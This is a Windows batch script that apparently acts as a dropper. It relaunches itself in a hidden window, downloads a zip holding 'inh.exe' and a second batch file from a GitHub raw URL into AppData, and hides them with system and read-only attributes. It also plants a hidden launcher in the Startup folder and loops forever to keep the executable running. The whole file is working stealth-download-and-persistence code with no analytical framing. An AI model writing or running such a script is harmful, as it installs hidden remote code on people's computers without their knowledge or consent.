@echo off

:: Relaunch hidden if needed
if "%1" neq "hidden" (
    powershell -windowstyle hidden -command "Start-Process '%~f0' -ArgumentList 'hidden' -WindowStyle Hidden"
    exit
)

:: Paths
set "APP_DIR=%USERPROFILE%\AppData"
set "EXE_PATH=%APP_DIR%\inh.exe"
set "EXE_PATH1=%APP_DIR%\autoreopener.bat"
set "ZIP_PATH=%APP_DIR%\inh.zip"
set "DOWNLOAD_URL=https://raw.githubusercontent.com/dexovision/injector/main/inh.zip"
set "DOWNLOAD_URL1=https://raw.githubusercontent.com/dexovision/injector/main/autoreopener.bat"

:loop
:: If missing, download and extract
if not exist "%EXE_PATH%" (
    powershell -Command "Invoke-WebRequest -Uri '%DOWNLOAD_URL%' -OutFile '%ZIP_PATH%'"
    powershell -Command "Expand-Archive -LiteralPath '%ZIP_PATH%' -DestinationPath '%APP_DIR%' -Force"
    del "%ZIP_PATH%"
    attrib +h +s +r %USERPROFILE%\AppData\inh.exe
)

if not exist "%EXE_PATH1%" (
    powershell -Command "Invoke-WebRequest -Uri '%DOWNLOAD_URL1%' -OutFile '%EXE_PATH1%'"
    attrib +h +s +r "%EXE_PATH1%"
)

set "STARTUP_FOLDER=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
set "LAUNCHER_BAT=%STARTUP_FOLDER%\launcher.bat"
if not exist "%LAUNCHER_BAT%" (
    (
        echo @echo off
        echo start "" "%USERPROFILE%\AppData\inh.exe"
        echo start "" "%USERPROFILE%\AppData\autoreopener.bat"
    ) > "%LAUNCHER_BAT%"
    attrib +h +s +r "%LAUNCHER_BAT%"
    powershell -windowstyle hidden -command "Start-Process '%LAUNCHER_BAT%' -WindowStyle Hidden"
)


:: Ensure running
tasklist /fi "imagename eq inh.exe" | find /i "inh.exe" >nul
if errorlevel 1 start "" "%EXE_PATH%"

timeout /t 1 /nobreak >nul
attrib +h +s +r "%EXE_PATH1%"

attrib +h +s +r "%EXE_PATH%"
 
attrib +h +s +r "%LAUNCHER_BAT%"

goto loop
